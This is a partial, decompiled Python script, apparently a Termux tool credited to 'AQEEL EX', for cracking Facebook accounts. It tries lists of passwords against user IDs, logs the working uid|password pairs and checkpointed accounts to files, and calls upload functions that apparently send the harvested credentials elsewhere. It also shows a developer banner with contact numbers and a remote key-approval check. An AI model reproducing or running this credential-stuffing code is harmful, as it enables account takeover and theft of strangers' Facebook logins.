# Decompile by : AQEELEX 
# Time Succes decompile : 2022-05-14 10:44:20.178972 
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/AQEEL.EX"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/AQEEL.EX")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +923175527464")
	subprocess.check_output(["am", "start", "https://wa.me/+923175527464"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Aqeel-Ex-06/OLD/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
`.__.'_.  `._ / |   `.__.'   `.__.'  (___) 
 ...
 > \033[0;92mDEVELOPER     : AQEEL EX
 > \033[0;95mFACEBOOK ID   : AQEEL EX
 > \033[0;41mWHATSAPP      : +923175527464
 \033[0;96m> YOUTUBE       : ÆQĘĽĘX TŔÍĆKŚ & HĘĽPÍŃG ŹÓŃĘ
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [AQLX] : %s/%s -> \033[0;92m [ AQLX-OK:%s ]- \033[0;93m[AQLX-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[AQLX-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [AQLX-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[AQLX-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [AQLX-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
